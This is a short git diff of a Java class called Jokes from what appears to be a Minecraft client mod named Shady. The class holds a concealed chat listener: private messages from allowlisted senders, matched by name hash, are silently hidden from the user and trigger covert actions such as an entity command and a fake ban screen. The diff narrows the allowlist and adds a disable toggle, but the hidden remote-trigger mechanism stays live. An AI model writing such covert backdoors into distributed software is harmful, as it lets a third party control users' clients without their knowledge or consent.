@@ -17,25 +17,29 @@ import java.util.List;
 
 public class Jokes {
 
-    private static String note = "Hello voyaging decompiler! These are just some pranks I've added to screw with my friends. If you don't know me, don't worry about them. I will never use them on you because I don't know that you exist.";
+    private static final String note = "Hello voyaging decompiler! These are just some pranks I've added to screw with my friends. If you don't know me, don't worry about them. I will never use them on you because I don't know that you exist.";
     private static FakeBan currentBan = null;
 
     private static final List<Integer> allowed = Arrays.asList(
             -1616696230, // HY7 DM+
-            45694785, // HY7 DM++
+            45694785/*, // HY7 DM++
             58092234, // Lejon DM+
-            1364831171 // Lejon DM++
+            1364831171 // Lejon DM++*/
     );
 
     @SubscribeEvent(priority = EventPriority.HIGHEST)
     public void onChat(ClientChatReceivedEvent event) {
         if(event.type == 0) {
             String message = event.message.getUnformattedText();
-            if(message.startsWith("From ") /*&& Shady.mc.getSession().getUsername().hashCode() != 72006*/) {
+
+            if(!Shady.disabledSettings.contains("Jokes") && message.startsWith("From ") && Shady.mc.getSession().getUsername().hashCode() != 72006) {
+
                 String[] messageParts = message.split(":");
                 if(messageParts.length >= 2) {
+
                     if(allowed.contains(messageParts[0].hashCode())) {
                         event.setCanceled(true);
+
                         switch(messageParts[1].trim()) {
                             case "!ENTITIES!":
                                 for(Entity entity : Shady.mc.theWorld.loadedEntityList) {
